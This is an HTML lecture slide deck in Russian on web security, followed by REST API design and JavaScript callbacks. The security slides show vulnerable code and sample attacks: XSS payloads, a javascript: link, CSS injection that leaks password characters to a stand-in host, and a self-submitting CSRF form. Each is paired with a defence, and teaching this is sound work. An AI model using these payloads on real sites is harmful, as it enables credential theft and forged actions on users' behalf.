<!DOCTYPE html>
<html lang="ru">
<head>
    <title>Безопасность web-приложений, архитектура web-приложений и разработка API</title>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
	<link rel="icon" type="image/png" href="/lib/favicon.png"/>
	<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
	<link rel="stylesheet" href="/lib/shower/themes/technopark/styles/screen-4x3.css">
	<link rel="stylesheet" href="/lib/slides.css">

</head>
<body class="shower list">

<header class="caption">
    <h1>Безопасность web-приложений, архитектура web-приложений и разработка API</h1>
    <p>Технопарк, весна, 2018 г.</p>
</header>

<section class="slide first">
    <h2 class="shout">Безопасность web-приложений<br/>
        <small>Слайды доступны по ссылке<br/>
            <a href="https://frontend-park-mailru.firebaseapp.com/">frontend-park-mailru.firebaseapp.com</a>
        </small>
    </h2>
</section>

<section class="slide">
    <h2>Same Origin Policy</h2>
    <blockquote>
        <p class="medium-content"><b>Правило ограничения домена (Same Origin Policy &mdash; «Принцип одинакового
            источника» a.k.a. «Политика единого источника»)</b> &mdash; это важная концепция безопасности и работы web-приложений. Она призвана
            <mark>ограничивать возможности</mark> пользовательских сценариев из определённого источника по доступу к ресурсам и информации из других
            источников</p>
    </blockquote>
	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank">Подробнее</a></p>
</section>

<section class="slide">
    <h2>Same Origin Policy</h2>
    <p>Вводится понятие
        <mark>источника</mark>
        (адрес в интернете, откуда был загружен&nbsp;ресурс). Два URL считаются имеющим один источник («same origin»), если у
        них
        <mark>одинаковый протокол, домен и порт</mark>
    </p>
    <p>У этих ресурсов одинаковые источники:</p>
    <ul>
        <li><code>http://site.com</code></li>
        <li><code>http://site.com/</code></li>
        <li><code>http://site.com/my/page.html</code></li>
    </ul>
</section>

<section class="slide">
    <h2>Same Origin Policy</h2>
    <p>У этих ресурсов <strong>разные</strong> источники:</p>
    <ul>
        <li><code>http://site.com</code></li>
        <li><code>http://<strong>www</strong>.site.com</code> (другой домен)</li>
        <li><code>http://site.<strong>org</strong></code> (другой домен)</li>
        <li><code><strong>https</strong>://site.com</code> (другой протокол)</li>
        <li><code>http://site.com:<strong>8080</strong></code> (другой порт)</li>
    </ul>
</section>

<section class="slide">
    <h2>Типы взаимодействия с ресурсами</h2>
    <p>Любой способ взаимодействия с ресурсами в web-приложениях можно отнести к одной из трёх категорий:</p>
    <ul>
        <li><mark><strong>"Запись" в ресурсы</strong></mark> &mdash; например: переходы по ссылкам, редиректы, сабмит форм, отправка запросов</li>
		<li><mark><strong>"Встраивание" ресурсов в другие ресурсы</strong></mark>:
			<ul>
				<li>JavaScript with <code>&lt;script src="...">&lt;/script></code></li>
				<li>CSS with <code>&lt;link rel="stylesheet" href="..."></code></li>
				<li>Images with <code>&lt;img></code>, media files with <code>&lt;video></code> and <code>&lt;audio></code></li>
				<li>Plug-ins with <code>&lt;object></code>, <code>&lt;embed></code> and <code>&lt;applet></code></li>
			</ul>
		</li>
		<li><mark><strong>"Чтение" из других ресурсов</strong></mark> &mdash; например: чтение ответов на запросы, получение доступа к содержимому встроенного ресурса...</li>
    </ul>
</section>

<section class="slide">
    <h2>Same Origin Policy</h2>
	<p class="small-content"></p>
    <ul>
        <li>Cross Origin "Запись" в ресурсы обычно разрешается (<em>за некоторыми исключениями, о них чуть позже</em>)</li>
		<li>Cross Origin "Встраивание" ресурсов обычно разрешается</li>
		<li>Cross Origin "Чтение" из других ресурсов по-умолчанию запрещено</li>
    </ul>
</section>

<section class="slide question">
    <h2>
        <span style="font-size: 85%">Способы обхода Same Origin Policy</span>
    </h2>
</section>

<section class="slide question">
    <h2>
        <span style="font-size: 85%">Cross-Site Scripting (XSS)</span>
    </h2>
</section>

<section class="slide">
    <h2>Cross-Site Scripting (XSS)</h2>
    <blockquote>
        <p class="medium-content"><b>Cross-Site Scripting</b> &mdash; атака, заключающаяся во <mark>внедрении на страницу вредоносного кода</mark>, который будет выполнен в контексте источника конкретного сайта с целью обхода политик единого источника, и взаимодействии этого кода с веб-сервером злоумышленника</p>
    </blockquote>
    <p class="note">С помощью XSS злоумышленник может <strong>украсть из браузера пользователя sensitive-данные</strong> (например, cookies с ID сессии пользователя, приватные данные пользователя или данные из форм), может <strong>выполнить от имени пользователя различные действия</strong> или, например, <strong>провести DOS-атаку</strong></p>
</section>

<section class="slide">
    <h2>Пример уязвимости</h2>
    <pre class="hljs php">
		<code>&lt;?php</code>
		<code>    $name = $_REQUEST ['name'];</code>
		<code>?></code>
		<code class="hljs html">&lt;html></code>
		<code class="hljs html">    &lt;head>&lt;title>Портал Технопарка&lt;/title>&lt;/head></code>
		<code class="hljs html">    &lt;body></code>
		<code>        Hello, &lt;?php echo $name; ?>!</code>
		<code class="hljs html">    &lt;/body></code>
		<code class="hljs html">&lt;/html></code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Использование уязвимости</h2>
	<p class="small-content"></p>
    <pre class="hljs js">
		<code>const html = '&lt;script>alert("XSS")&lt;/script>';</code>
		<code>const link =</code>
		<code>    'https://park.mail.ru/?name=' + encodeURIComponent(html);</code>
		<code> </code>
		<code>console.log(link);</code>
		<code>// https://park.mail.ru/?name=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Пример уязвимости</h2>
	<p class="small-content"></p>
	<pre class="hljs js">
		<code>const response = http.get('/message');</code>
		<code>const messageText = response.content;</code>
		<code> </code>
		<code>const chat = document.getElementById('chat');</code>
		<code>chat.innerHTML += messageText;</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Использование уязвимости</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>// так не сработает</code>
		<code>chat.innerHTML += `</code>
		<code class="hljs html">    &lt;/div>&lt;script>alert("XSS")&lt;/script></code>
		<code>`;</code>
		<code> </code>
	</pre>
	<pre class="hljs js next">
		<code>// а вот так - получится</code>
		<code>chat.innerHTML += `</code>
		<code class="hljs html">    &lt;/div>&lt;img src="/404.png" onerror="alert('XSS')"></code>
		<code>`;</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Пример уязвимости</h2>
	<p class="small-content"></p>
	<pre class="hljs js">
		<code>// делаем сайт с oauth-авторизацией</code>
		<code>const backRedirectUrl =</code>
		<code>    new URLSearchParams(window.location.search).get('back');</code>
		<code> </code>
		<code>const link = document.createElement('a');</code>
		<code>link.textContent = 'Click Me!';</code>
		<code>link.href = backRedirectUrl;</code>
		<code>document.appendChild(link);</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Использование уязвимости</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>// находимся на</code>
		<code>// https://park.mail.ru/?back=javascript%3Aalert%28%27XSS%27%29%3B</code>
		<code>const backRedirectUrl = // "javascript:alert('XSS');"</code>
		<code>    new URLSearchParams(window.location.search).get('back');</code>
		<code> </code>
		<code>const link = document.createElement('a');</code>
		<code>link.href = backRedirectUrl;</code>
		<code> </code>
		<code class="hljs html">// &lt;a href="javascript:alert('XSS');">Click Me!&lt;a></code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Пример уязвимости</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>const avatarUrl = http.get('/me').avatarUrl;</code>
		<code> </code>
		<code>const styleContent = `</code>
		<code>    <span hidden>`</span>#avatar {<span hidden>`</span></code>
		<code>    <span hidden>`</span>    background: url(${avatarUrl});<span hidden>`</span></code>
		<code>    <span hidden>`</span>}<span hidden>`</span></code>
		<code>`;</code>
		<code> </code>
		<code>const style = document.createElement('style');</code>
		<code>style.textContent = styleContent;</code>
		<code>document.appendChild(style);</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Использование уязвимости</h2>
	<p class="medium-content"></p>
	<pre class="hljs js">
		<code>const avatarUrl = http.get('/me').avatarUrl;</code>
		<code class="hljs js">console.log(avatarUrl); -> `);}<span hidden>`</span></code>
		<code class="hljs css">[type=password][value^='a'] { background-image: url(https://hack.er/a); }</code>
		<code class="hljs css">[type=password][value^='b'] { background-image: url(https://hack.er/b); }</code>
		<code class="hljs css">[type=password][value^='c'] { background-image: url(https://hack.er/c); }</code>
		<code class="hljs css">[type=password][value^='d'] { background-image: url(https://hack.er/d); }</code>
		<code class="hljs css">[type=password][value^='e'] { background-image: url(https://hack.er/e); }</code>
		<code class="hljs js"><span hidden>`</span>abc { background: url(`</code>
		<code class="hljs css"> </code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Использование уязвимости</h2>
	<p class="medium-content"></p>
	<pre class="hljs css">
		<code>#avatar {</code>
		<code class="hljs css">    background: url();}</code>
		<code class="hljs css">[type=password][value^='a'] { background-image: url(https://hack.er/a); }</code>
		<code class="hljs css">[type=password][value^='b'] { background-image: url(https://hack.er/b); }</code>
		<code class="hljs css">[type=password][value^='c'] { background-image: url(https://hack.er/c); }</code>
		<code class="hljs css">[type=password][value^='d'] { background-image: url(https://hack.er/d); }</code>
		<code class="hljs css">[type=password][value^='e'] { background-image: url(https://hack.er/e); }</code>
		<code class="hljs css">div { background: url();</code>
		<code class="hljs css">}</code>
		<code class="hljs css"> </code>
		<code> </code>
	</pre>
</section>

<section class="slide">
	<h2>Использование уязвимости</h2>
	<p class="medium-content"></p>
	<pre class="hljs css">
		<code>#avatar {</code>
		<code class="hljs css">    background: url(<mark>);}</mark></code>
		<code class="hljs css"><mark>[type=password][value^='a'] { background-image: url(https://hack.er/a); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='b'] { background-image: url(https://hack.er/b); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='c'] { background-image: url(https://hack.er/c); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='d'] { background-image: url(https://hack.er/d); }</mark></code>
		<code class="hljs css"><mark>[type=password][value^='e'] { background-image: url(https://hack.er/e); }</mark></code>
		<code class="hljs css"><mark>div { background: url(</mark>);</code>
		<code class="hljs css">}</code>
		<code class="hljs css"> </code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Способы защиты от XSS</h2>
    <p class="medium-content"></p>
    <ul>
        <li>Тщательная фильтрация и экранирование пользовательского контента, вставляемого напрямую через <code>DOM API</code></li>
        <li>Использование белых списков при фильтрации HTML</li>
        <li>Правильная работа с куками, использование <code>httpOnly</code></li>
        <li>Использование специального заголовка <code>X-XSS-Protection</code></li>
        <li>Ещё больше про XSS <a href="https://habrahabr.ru/company/pt/blog/149152/" target="_blank">тут</a> и <a href="https://habrahabr.ru/company/xakep/blog/189210/" target="_blank">тут</a></li>
    </ul>
</section>

<section class="slide question">
    <h2>
        <span style="font-size: 85%">Clickjacking (угон&nbsp;кликов)</span>
    </h2>
</section>

<section class="slide">
    <h2>Элемент <code>&lt;iframe></code></h2>
    <blockquote>
        <p class="medium-content">Элемент <code>&lt;iframe></code> создаёт фрейм &mdash; область заданных размеров,
            которая находится внутри обычного документа, в которую можно загружать любые другие независимые документы
        </p>
    </blockquote>
</section>

<section class="slide">
    <h2>Элемент <code>&lt;iframe></code></h2>
    <code>&lt;iframe src="https://www.w3.org/" width="900" height="500"></code>

    <iframe src="https://www.w3.org/" frameborder="0" id="frameMy" width="900" height="510"></iframe>
</section>

<section class="slide">
    <h2>Атака Clickjacking (угон кликов)</h2>
    <blockquote>
        <p class="medium-content"><b>Атака Clickjacking</b> &mdash; механизм обмана пользователей, при котором злоумышленник может получить доступ к конфиденциальной информации или даже заставить пользователя выполнить определённые действия, заманив его на внешне безобидную страницу или внедрив вредоносный код на безопасную страницу</p>
    </blockquote>
</section>

<section class="slide">
    <h2>Атака Clickjacking (угон кликов)</h2>
    <p class="medium-content"></p>
    <ol>
        <li>Заманиваем пользователя на нашу страницу</li>
        <li>Открываем на нашей странице <mark>iframe с facebook'ом</mark>, делаем ему <code>opacity:&nbsp;0;</code> и позиционируем под курсором пользователя</li>
        <li>Смещаем содержимое iframe так, чтобы в окне оказалась кнопка подписки на сообщество</li>
        <li>Пользователь делает клик</li>
        <li>???????</li>
        <li>PROFIT!</li>
    </ol>
</section>

<section class="slide">
    <h2>Защита от Clickjacking</h2>
    <p>Используем заголовок <code>X-Frame-Options</code>:</p>
    <ul>
        <li><code>X-Frame-Options: DENY</code> &mdash; запрещает открывать сайт внутри iframe</li>
        <li><code>X-Frame-Options: SAMEORIGIN</code> &mdash; разрешает открывать сайт внутри iframe на страницах с тем же самым origin</li>
        <li><code>X-Frame-Options: ALLOW-FROM https://example.com/</code> &mdash; разрешает открывать сайт внутри iframe на страницах с указанным origin</li>
    </ul>
</section>

<section class="slide">
    <h2>Какая ещё есть угроза <br>связанная с <strong>iframe</strong>?</h2>
    <p>У элемента <code>iframe</code> есть свойства, позволяющие получить доступ до содержимого страницы:</p>
    <ul>
        <li><code>iframe.contentWindow</code> &mdash; ссылка на <code>window</code> страницы,<br>загруженной в <code>iframe</code></li>
        <li><code>iframe.contentWindow.document</code> &mdash; ссылка на <code>document</code> страницы, загруженной в <code>iframe</code></li>
        <li><code>window.parent</code> &mdash; внутри <code>iframe</code> ссылается на родительский документ</li>
        <li><code>window.top</code> &mdash; внутри <code>iframe</code> ссылается самый верхний родительский элемент (в случае iframe в iframe)</li>
    </ul>
</section>

<section class="slide">
    <h2>Ограничения <strong>iframe</strong></h2>
    <p class="medium-content"></p>
    <ul>
        <li>На все <code>iframe</code> всегда накладываются ограничения, диктуемые <br> Same Origin Policy</li>
        <li>В частности, если в <code>iframe</code> загружен ресурс с другим Origin, то эти две страницы не имеют доступа друг до друга через <code>iframe.contentWindow</code> и <code>window.parent</code></li>
		<li>Запись в <code>window.parent.location</code> разрешена, а чтение &mdash; запрещено</li>
        <li>У элемента <code>iframe</code> есть атрибут <code>sandbox</code> с возможными значениями: <code>allow-same-origin</code>, <code>allow-top-navigation</code>, <code>allow-forms</code>, <code>allow-scripts</code></li>
    </ul>
</section>

<section class="slide">
    <h2>Общение между <strong>iframe</strong> <mark>напрямую</mark></h2>
	<p>Присваивая в <code>document.domain</code> одинаковые значения, можно разрешить страницам с <em>разных поддоменов</em> общение друг с другом через <mark>iframe</mark> напрямую</p>
    <pre class="hljs js">
		<code>// на странице https://park.mail.ru/</code>
		<code><mark>document.domain</mark>; // 'park.mail.ru'</code>
		<code>document.domain = 'mail.ru'; // success</code>
		<code>document.domain = 'e.mail.ru'; // error</code>
		<code>document.domain = 'google.com'; // error</code>
		<code> </code>
		<code>// на странице https://e.mail.ru/</code>
		<code>document.domain = 'mail.ru'; // success</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Общение с помощью <mark>postMessage</mark></h2>
	<p class="medium-content"></p>
    <pre class="hljs js">
		<code>otherWindow.postMessage(message, targetOrigin);</code>
		<code>// otherWindow - любой объект класса Window</code>
		<code><span hidden>//</span>    - текущий <mark>window</mark></code>
		<code><span hidden>//</span>    - полученный через вызов <mark>window.open()</mark></code>
		<code><span hidden>//</span>    - полученный через <mark>iframe.contentWindow</mark> или <mark>window.parent</mark></code>
		<code> </code>
		<code>// targetOrigin - <mark>origin</mark> ресурсов, которые получат сообщения</code>
		<code><span hidden>//</span>                  можно указать wildcard: '*'</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Событие <mark>message</mark></h2>
	<p class="medium-content"></p>
    <pre class="hljs js">
		<code>window.addEventListeners('message', function (event) {</code>
		<code>    console.log(event.data); // присланные данные</code>
		<code>    console.log(event.origin); // <mark>origin</mark>, из которого пришло сообщение</code>
		<code>    console.log(event.source); // ссылка на окно-отправитель сообщения</code>
		<code>});</code>
		<code> </code>
	</pre>
	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" target="_blank">Подробнее</a></p>
</section>

<section class="slide question">
    <h2>
        <span style="font-size: 75%">Cross-Site Request Forgery (CSRF)</span>
    </h2>
</section>

<section class="slide">
    <h2>Атака CSRF</h2>
    <ol>
        <li>Пользователь заходит на сайт, на котором размещена вот такая форма:</li>
        <pre class="hljs html">
			<code>&lt;form action="https://e.mail.ru/api/v1/messages/send" method="POST"></code>
			<code>    &lt;input name="message" value="Evil message"></code>
			<code>    &lt;!-- ... --></code>
			<code>&lt;/form></code>
			<code> </code>
		</pre>
        <li>При заходе на сайт, js-скрипт вызывает <code>submit()</code> у формы</li>
        <li>Отправляется POST-запрос на страницу <code>https://e.mail.ru/api/v1/messages/send</code></li>
        <li>Т.к. пользователь авторизован в Почте@Mail.Ru, то запрос отправляется с куками пользователя и от имени пользователя отправляется письмо</li>
    </ol>
</section>

<section class="slide">
    <h2>В атаке используется слабая<br>сторона авторизации через cookies</h2>
    <blockquote>
        <p class="medium-content"><b>Cookies</b> позволяют проверить, кто отправил определённый запрос, но они ничего не говорят о данных этого запроса</p>
    </blockquote>
    <p class="note">Браузеры не понимают, как различить, было ли действие явно совершено пользователем <em>(как, скажем, нажатие кнопки на форме или переход по ссылке)</em> или пользователь неумышленно выполнил это действие <em>(зайдя на "плохой" сайт)</em></p>
</section>

<section class="slide">
    <h2>Защита от CSRF-атак с помощью<br>CSRF-токенов</h2>
    <ol>
        <li>При первом запросе на сервер в теле ответа или в заголовке <code>X-CSRF-Token</code> сервер передаёт на клиент <mark>token</mark> &mdash; случайную строку, и клиент сохраняет её у себя в какой-то переменной, но не в cookies</li>
        <li>При последующих запросах на сервер клиент добавляет этот токен в заголовки запросов или в специальное поле в теле запроса</li>
        <li>Сервер на каждый запрос валидирует <mark>token</mark> и если он не был передан, либо он неверный, то сервер отклоняет этот запрос</li>
        <li>Т.к. злоумышленнику токен не известен, то он не сможет подделать наш запрос</li>
    </ol>
</section>

<section class="slide question">
    <h2><span style="font-size: 80%; display: inline-block;">Как обходить Same Origin Policy?</span></h2>
</section>

<section class="slide question">
    <h2><span style="font-size: 80%">Архитектура наших приложений</span></h2>
</section>

<section class="slide">
    <h2>Архитектура наших приложений?</h2>
    <div style="position:relative;width: 100%; height: 75%;">
        <img class="place" src="arch.png" style="transform-origin: center;transform: translate(-50.45%,-51%) scale(.893);">
    </div>
</section>

<section class="slide">
    <h2>HTTP access control (CORS)</h2>
	<p class="medium-content"></p>
    <blockquote>
        <p class="small-content"><b>Cross-Origin Resource Sharing (CORS) standard</b> &mdash; спецификация,
            позволяющаы обойти ограничения, которые Same Origin Policy накладывает на кросс-доменные запросы</p>
    </blockquote>
	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" target="_blank">Подробнее</a></p>
</section>

<section class="slide">
	<h2>Cross Origin HTTP-запросы (
		<mark>XHR</mark>
		)
	</h2>
	<pre class="hljs js">
		<code>// Находимся на https://evil.com/</code>
		<code>const xhr = new XMLHttpRequest();</code>
		<code>xhr.open('GET', <mark>'https://e.mail.ru/messages/inbox/'</mark>, false);</code>
		<code>xhr.send();</code>
		<code> </code>
		<code>console.log(xhr.responseText)</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <h2>Запросы делятся на два типа</h2>
    <p>Простыми считаются запросы, если они удовлетворяют следующим двум условиям:</p>
    <ul>
        <li>Простой метод: GET, POST или HEAD</li>
        <li>Простые заголовки &mdash; только из списка:
            <ul>
                <li><code>Accept</code></li>
                <li><code>Accept-Language</code></li>
                <li><code>Content-Language</code></li>
                <li><code>Content-Type</code>
					<ul>
						<li><code>application/x-www-form-urlencoded</code></li>
						<li><code>multipart/form-data</code></li>
						<li><code>text/plain</code></li>
					</ul>
				</li>
            </ul>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>CORS для простых запросов</h2>
    <pre class="hljs http">
			<code>GET /data HTTP/1.1</code>
			<code>Host: e.mail.ru</code>
			<code>Origin: http://frontend.tech-mail.ru</code>
			<code> </code>
		</pre>
    <pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/html; charset=UTF-8</code>
			<code><mark>Access-Control-Allow-Origin:</mark> http://frontend.tech-mail.ru</code>
			<code>// Access-Control-Allow-Origin: *</code>
			<code> </code>
		</pre>
</section>

<section class="slide">
    <h2>CORS для простых запросов:<br/>дополнительные заголовки</h2>
    <pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/html; charset=UTF-8</code>
			<code>Access-Control-Allow-Origin: http://frontend.tech-mail.ru</code>
			<code>...</code>
			<code>X-UID: 42</code>
			<code>X-Secret: 2c9de507f2c54aa1</code>
			<code><mark>Access-Control-Expose-Headers:</mark> X-Uid, X-Authentication</code>
			<code> </code>
		</pre>
</section>

<section class="slide">
    <h2>CORS для простых запросов:<br/>данные авторизации</h2>
    <pre class="hljs js">
			<code>const xhr = new XMLHttpRequest();</code>
			<code>xhr.<mark>withCredentials</mark> = true;</code>
			<code>xhr.open('GET', 'https://e.mail.ru/messages/inbox/', false);</code>
			<code> </code>
		</pre>
    <pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/html; charset=UTF-8</code>
			<code>Access-Control-Allow-Origin: <mark>domain</mark> // '*' запрещено</code>
			<code><mark>Access-Control-Allow-Credentials:</mark> true</code>
			<code> </code>
		</pre>
</section>

<section class="slide">
	<h2>Запросы делятся на два типа</h2>
	<p class="small-content">Остальные запросы считаются
		<mark>"непростыми"</mark>
		, и при отправке таких запросов необходимо понять, согласен ли сервер на обработку таких запросов. Эти запросы
		всегда отсылаются со специальным заголовком <code>Origin</code></p>
</section>

<section class="slide">
    <h2>"Непростые" запросы</h2>
    <p>При отправке "непростого" запроса, браузер сделает на самом деле <strong>два</strong> HTTP-запроса.
    <ul>
        <li>«Предзапрос» (английский термин «preflight») OPTIONS. Cодержит название желаемого метода в заголовке <code>Access-Control-Request-Method</code>,
            а если добавлены особые заголовки, то и их тоже &mdash; в <code>Access-Control-Request-Headers</code>.
        </li>
        <li>Основной HTTP-запрос с заголовком <code>Origin</code></li>
    </ul>
</section>

<section class="slide">
    <h2>"Непростые" запросы</h2>
    <p>Ответ на предзапрос может содержать следующие заголовки</p>
    <pre class="hljs http">
			<code>HTTP/1.1 200 OK</code>
			<code>Content-Type: text/plain</code>
			<code><mark>Access-Control-Allow-Methods:</mark> DELETE, PUT, HEAD, OPTIONS, GET, POST</code>
			<code><mark>Access-Control-Allow-Headers:</mark> Content-Type, User-Agent ...</code>
			<code>         ... X-Requested-With, If-Modified-Since, Cache-Control</code>
			<code><mark>Access-Control-Max-Age:</mark> 86400</code>
			<code> </code>
		</pre>
</section>


<!--закончили с Безопасностью-->


<section class="slide">
    <h2 class="shout">Работа с API</h2>
</section>

<section class="slide">
    <h2>Что есть
        <mark>API</mark>
    </h2>
    <blockquote>
        <p class="medium-content"><b>API (application programming interface, интерфейс программирования приложений)</b>
            &mdash; набор готовых классов, процедур, функций, структур и констант, предоставляемых приложением
            (библиотекой, сервисом) или операционной системой для использования во внешних программных продуктах.
            Используется программистами при написании всевозможных приложений</p>
    </blockquote>
</section>

<section class="slide">
    <h2>Что есть
        <mark>API</mark>
    </h2>
    <p>API определяет
        <mark>функциональность</mark>
        , которую предоставляет программа (модуль, библиотека), при этом API позволяет абстрагироваться от того, как
        именно эта функциональность реализована
    </p>
    <p><b>Web API</b> &mdash; используется в веб-разработке, как правило, определённый набор HTTP-запросов, а также
        определение
        <mark>структуры</mark>
        HTTP-ответов, для выражения которых используют XML или JSON форматы
    </p>
</section>

<section class="slide">
    <h2>Сема́нтика</h2>
    <blockquote>
        <p><b>Сема́нтика</b> &mdash; раздел лингвистики, изучающий смысловое значение единиц языка</p>
    </blockquote>
    <p><br/>
        &ndash; <em>Работодатель:</em> Назовите вашу главную слабость <br/>
        &ndash; <em>Кандидат:</em> Я даю
        <mark>семантически</mark>
        корректные, но практически неприменимые ответы на вопросы <br/>
        &ndash; <em>Работодатель:</em> Могли бы вы привести пример? <br/>
        &ndash; <em>Кандидат:</em> Да, мог бы
    </p>
</section>

<section class="slide">
    <h2>CRUD</h2>
    <blockquote>
        <p><b>CRUD (create, read, update, delete)</b> &mdash; акроним, обозначающий четыре базовые функции, используемые
            при работе с персистентными хранилищами данных, описывает семантику методов HTTP</p>
    </blockquote>
    <ul>
        <li>GET (чтение данных)</li>
        <li>POST (создание данных)</li>
        <li>PUT (полное обновление данных) или PATCH (частичное обновление данных)</li>
        <li>DELETE (удаление данных)</li>
        <li>HEAD запрашивает ресурс так же, как и GET, но без тела ответа</li>
        <li>OPTIONS используется для описания параметров соединения с ресурсом</li>
    </ul>
</section>

<section class="slide">
    <h2>REST</h2>
    <blockquote>
        <p><b>REST (в применении к именованию ресурсов)</b> &mdash; набор методик и практик, которые используются для
            именования ресурсов, с которыми работает система</p>
    </blockquote>
    <p>Все типы ресурсов делятся на две категории:</p>
    <ul>
        <li>
            <mark>коллекции ресурсов</mark> &mdash; имеют имя
        </li>
        <li>
            <mark>отдельные представители</mark> &mdash; принадлежат к какой-то коллекции и имеют идентификатор, чтобы
            отличать различных представителей коллекции друг от друга
        </li>
    </ul>
</section>

<section class="slide">
    <h2>REST</h2>
    <p>Коллекция книг (books):</p>
    <ul>
        <li>Вся коллекция получает URI <code>/books</code></li>
        <li>Идентификатор книги &mdash; её ISBN. Отдельные книги:
            <ul>
                <li><code>/books/2-266-11156-6</code></li>
                <li><code>/books/3-720-55486-7</code></li>
                <li><code>/books/1-054-55901-2</code></li>
            </ul>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>REST</h2>
    <p>Коллекция пользователей (users):</p>
    <ul>
        <li>Вся коллекция получает URI <code>/users</code></li>
        <li>Идентификатор пользователя &mdash; его ID. Отдельные пользователи:
            <ul>
                <li><code>/users/id2</code></li>
                <li><code>/users/id432</code></li>
                <li><code>/users/id1211177181</code></li>
            </ul>
        </li>
    </ul>
</section>

<section class="slide">
    <h2>REST + CRUD = семантическое API</h2>
    <pre class="hljs http">
			<code>Получение всех книг</code>
			<code>GET /books HTTP/1.1</code>
			<code>Host: awesome.com</code>
			<code> </code>
			<code>Получение конкретной книги</code>
			<code>GET /books/3-720-55486-7 HTTP/1.1</code>
			<code>Host: awesome.com</code>
			<code> </code>
			<code>Удаление конкретной книги</code>
			<code>DELETE /books/3-720-55486-7 HTTP/1.1</code>
			<code>Host: awesome.com</code>
			<code> </code>
		</pre>
</section>

<section class="slide">
    <h2>Документирование API</h2>
    <p class="small-content"></p>
    <ul>
        <li><a href="http://swagger.io/" target="_blank">swagger</a></li>
        <li><a href="https://apiary.io/" target="_blank">apiary</a></li>
        <li><a href="https://apiblueprint.org/" target="_blank">apiblueprint</a></li>
        <li>Ваши варианты ;)</li>
    </ul>
</section>


<!--закончили с API-->


<section class="slide">
    <h2 class="shout">Promise и<br/>Fetch API</h2>
</section>

<section class="slide question">
    <h2>
        <span style="font-size: 85%">Асинхронность в JavaScript</span>
    </h2>
</section>

<section class="slide">
    <!--
    прежде чем говорить о промисах и прочей ерунде
    надо рассказать о том что такое callback hell
    или более широкое понятие pyramid of doom.

    Не тот Doom который лучше чем DOM.

    вспомним о том что такое callback-и

    функции могут возвращать результат естественным путем
    функции могут возвращать результат через callback (когда мы работаем с асинхронным кодом)

    callback это функция которую мы передаем в другую функцию чтобы та в свою очередь вызвала

    из-за этой особенности многим трудно понимать код на JS:
    код выполняется не сверху вниз а фиг пойми как

    например на слайде нижнее сообщение выполнится первым

    это сделано не просто так а ради неблокирующих операций IO

    асинхронность в JS это сила а не слабость, но за всё надо платить

    но какой код мы напишем если после первой операции
    нам нужно будет сделать еще одну асинхронную и вывести результат?
    -->
    <h2>Асинхронность в JavaScript</h2>
    <pre class="hljs js">
		<code>http.get('/user', function (err, user) {</code>
		<code>    if (err) {</code>
		<code>        console.error(err);</code>
		<code>        return;</code>
		<code>    }</code>
		<code>    console.log('User is', user);</code>
		<code>});</code>
		<code> </code>
		<code>console.log('Waiting...');</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <!--
    скорей всего мы просто добавим её вызов в наш callback
    финальный console.log вынесем в новый callback

    а что если нам нужен еще один вызов? или if вставить?
    -->
    <h2>Callback Hell</h2>
    <pre class="hljs js">
		<code>http.post('/signup', user, function (err, resp1) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.get(`/users/${resp1.id}`, function (err, resp2) {</code>
		<code>        if (err) { return console.error(err); }</code>
		<code>        http.get(`/photos/${resp2.avatarId}`, function (err, avatar) {</code>
		<code>            if (err) { return console.error(err); }</code>
		<code>            // ... callback hell!</code>
		<code>        });</code>
		<code>    });</code>
		<code>});</code>
		<code> </code>
	</pre>
</section>

<section class="slide">
    <!--
    будет так

    это и называется callback hell или pyramid of doom

    пирамида потому-что пирамида
    callback hell потому что это callback-и и это ад

    т.е. суть в том когда код растет вправо быстрей чем вниз

    надеюсь не надо объяснять почему это плохо
    тех кому это не понятно понимание настигнет само,
    главное больше так писать

    -->
    <h2>Callback Hell</h2>
    <div style="position:relative;width: 100%; height: 75%;">
        <img class="place" src="callbackHell.png" style="transform-origin: center;transform: translate(-50%,-50%) scale(1.25);">
    </div>
</section>

<section class="slide">
    <h2>Избавляемся от пирамид</h2>
    <!--
    как только мы осознали что пирамиды это плохо
    хочется от них избавиться

    сделать это можно например так:

    выносим колбеки как отдельные функции
    придумываем адекватные названия

    расположить их при этом можно в порядке выполненения (JS это позволяет)
    или по старинке следуя правилу "не использовать до объявления"

    пирамид больше нет но callback-и остались
    -->
    <pre class="hljs js">
		<code>http.post('/signup', user, <mark>onSignup</mark>);</code>
		<code> </code>
		<code>function onSignup (err, resp1) {</code>
		<code>    if (err) { return console.error(err); }</code>
		<code>    http.get(`/users/${resp1.id}`, <mark>onLoadUser</mark>);</code>
		<code>}</code>
